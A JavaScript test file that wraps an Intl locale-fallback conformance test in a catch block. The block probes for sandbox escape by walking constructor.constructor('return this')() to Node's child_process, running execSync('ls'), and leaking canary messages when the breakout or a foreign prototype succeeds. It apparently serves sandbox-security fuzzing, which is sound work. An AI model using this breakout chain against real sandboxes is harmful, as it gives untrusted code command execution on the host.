try {
    testWithIntlConstructors(function (Constructor) {
        var info = getLocaleSupportInfo(Constructor);
        for (var locale of info.supported) {
            var match = /^([a-z]{2,3})(-[A-Z][a-z]{3})?(-(?:[A-Z]{2}|[0-9]{3}))?$/.exec(locale);
            assert.notSameValue(match, null, 'Locale ' + locale + ' is supported, but can\'t be parsed.');
            var [language, script, region] = match.slice(1);
            if (script !== undefined) {
                var fallback = language + script;
                assert(info.supported.includes(fallback) || info.byFallback.includes(fallback), 'Locale ' + locale + ' is supported, but fallback ' + fallback + ' isn\'t.');
            }
            if (region !== undefined) {
                var fallback = language + region;
                assert(info.supported.includes(fallback) || info.byFallback.includes(fallback), 'Locale ' + locale + ' is supported, but fallback ' + fallback + ' isn\'t.');
            }
        }
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}